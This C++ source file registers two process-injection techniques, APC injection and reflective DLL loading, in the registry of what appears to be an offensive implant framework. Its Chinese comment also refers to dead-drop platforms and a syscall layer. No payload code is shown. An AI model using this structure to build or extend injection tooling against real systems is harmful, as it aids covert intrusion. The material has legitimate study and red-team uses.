/**
 * @file RegisterBuiltin.cpp
 * @brief 内建注入方法注册点 —— 加手法 = Methods/<名>/ 建目录 + 在此加一行 Register
 * @details
 * 显式注册(静态自注册会被链接器丢弃, DeadDropPlatforms.hpp 同案裁定)。
 * 方法按「声明契约」实现 IInjectionMethod; 平台 API 只经 L1 syscall 层与
 */
#include "Core/Inject/InjectionRegistry.hpp"

#include "Core/Inject/Methods/ApcInjection/ApcInjection.hpp"
#include "Core/Inject/Methods/ReflectiveLoad/ReflectiveLoad.hpp"

#include <mutex>

namespace cleat {
namespace injection {

    void RegisterBuiltinInjectionMethods() {
        static std::once_flag once;
        std::call_once(once, [] {
            auto& registry = InjectionRegistry::Instance();
            registry.Register(std::make_unique<ApcInjection>());
            registry.Register(std::make_unique<ReflectiveLoad>());
        });
    }

} // namespace injection
} // namespace cleat
